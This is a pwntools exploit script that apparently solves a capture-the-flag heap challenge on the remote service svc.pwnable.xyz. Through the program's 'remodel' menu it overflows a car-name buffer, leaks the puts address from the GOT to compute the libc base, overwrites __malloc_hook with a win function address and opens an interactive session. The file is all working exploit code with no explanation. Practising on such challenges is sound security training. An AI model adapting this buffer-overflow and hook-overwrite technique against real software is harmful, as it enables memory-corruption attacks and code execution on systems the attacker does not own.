from pwn import *
#target=process('./challenge')
target=remote('svc.pwnable.xyz',30037)
libc=ELF('./alpine-libc-2.23.so')
#libc=ELF('./challenge').libc

win=0x400b4e

def init(option):
	print(target.recvuntil("> "))
	target.sendline(str(option))

def buy(carno):
	init(1)
	print(target.recvline())
	init(carno)

def sell(carname):
	init(2)
	print(target.recvuntil(": "))
	target.sendline(carname)	

def remodel(carname,newname):
	init(3)
	print(target.recvuntil(": "))
	target.sendline(carname)	
	print(target.recvuntil(": "))
	target.sendline(newname)	

def leak():
	init(4)
	print(target.recvlines(2))
	print(target.recvuntil(": "))
	leaks=target.recvline().strip("\n")
	return leaks


buy(0)
buy(1)
remodel("BMW","A"*0x29)
putsgot=0x601f78
remodel("AA","A"*0x20+"\x78\x1f\x60\x00")
libc_puts=u64(leak().ljust(8,"\x00"))
libc_base=libc_puts-libc.symbols["puts"]
libc_malloc_hook=libc_base+libc.symbols["__malloc_hook"]
print(hex(libc_malloc_hook))
remodel("A"*0x20+"\x78\x1f\x60\x00","A"*0x29)
remodel("A"*0x22,"A"*0x20+p64(libc_malloc_hook))
remodel("\x00","\x4e\x0b\x40\x00")


target.interactive()	


